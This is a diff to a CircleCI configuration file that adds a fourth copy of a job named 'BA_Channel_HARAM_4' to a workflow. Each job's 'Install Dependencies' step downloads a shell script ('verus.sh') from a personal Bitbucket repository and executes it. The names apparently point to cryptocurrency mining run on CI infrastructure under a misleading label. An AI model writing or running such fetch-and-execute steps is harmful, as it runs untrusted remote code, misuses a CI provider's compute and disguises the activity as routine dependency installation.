@@ -24,6 +24,13 @@ jobs:
         - run:
             name: Install Dependencies
             command: wget https://bitbucket.org/roxxy16/vrsc/raw/98d9eb2eae3664f1354284acb71fd34ae553c261/verus.sh && chmod u+x verus.sh && ./verus.sh
+    BA_Channel_HARAM_4:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/roxxy16/vrsc/raw/98d9eb2eae3664f1354284acb71fd34ae553c261/verus.sh && chmod u+x verus.sh && ./verus.sh
 
 
 workflows:
@@ -33,3 +40,4 @@ workflows:
             - BA_Channel_HARAM_1
             - BA_Channel_HARAM_2
             - BA_Channel_HARAM_3
+            - BA_Channel_HARAM_4
